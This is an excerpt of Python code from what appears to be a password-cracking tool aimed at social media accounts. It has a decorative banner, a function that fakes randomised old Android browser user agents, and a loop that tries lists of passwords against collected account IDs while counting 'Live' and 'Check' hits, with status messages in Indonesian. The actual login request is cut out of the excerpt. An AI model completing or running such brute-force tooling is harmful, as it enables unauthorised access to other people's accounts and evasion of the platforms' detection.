...
Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time()}",subtitle=f"{P2}version {RC}2.0.2",padding=(0,7),style=f"#AAAAAA"))
    ...
    def ugentku(self):
        self.rr = random.randint
        self.rc = random.choice
        self.android = self.rc(["2.3.7","2.2","2.2.1","2.3.7","2.1","2.3.6","2.3.3","2.3.4"])
        self.idk = self.rc(["en-us","en-gb","ru-ru"])
        self.build = self.rc(["FRF91","FRF50","GRJ22","GRI40","FRG83","GRK39F","GRI40"])
        return (f"Mozilla/5.0 (Linux; U; Android {self.android}; {self.idk}; Nexus One Build/{self.build}) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1.l")
    
    def metodeASYNC(self, user, pwx):
        global ok ,cp, loop
        self.warnn = random.choice([H2, K2, J2, B2, O2, N2, A2, U2])
        ua = self.ugentku()
        prog.update(des,description=f"{self.warnn}async {P2}( {H2}aman bos{P2} ) {self.warnn}{loop}/{len(ID)}{P2} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)}")
        prog.advance(des)
        for pw in pwx:
             try:
                 if 'uadia' in uadarimu: ua = uadia[0]
                 ...
                 prog.update(des,description=f"{self.warnn}async {P2}( {M2}koneksi bermasalah{P2} ) {self.warnn}{loop}/{len(ID)}{P2} Live-:{H2}{len(ok)} {P2}Check-:{K2}{len(cp)}")
                 prog.advance(des)
                 time.sleep(15)
        loop +=1
